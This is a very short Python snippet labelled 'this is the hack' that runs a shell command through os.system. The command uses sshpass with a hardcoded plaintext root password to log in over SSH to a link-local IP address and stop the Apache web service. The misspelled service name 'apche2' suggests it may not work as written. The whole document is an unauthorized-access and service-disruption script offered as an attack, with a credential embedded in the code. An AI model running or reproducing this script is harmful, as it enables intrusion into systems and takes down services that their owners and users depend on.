# this is the hack

cmd = "sshpass -p 'goodyear123!@#' ssh -t root@169.254.236.100 sudo service apche2 stop";
import os;
os.system(cmd);

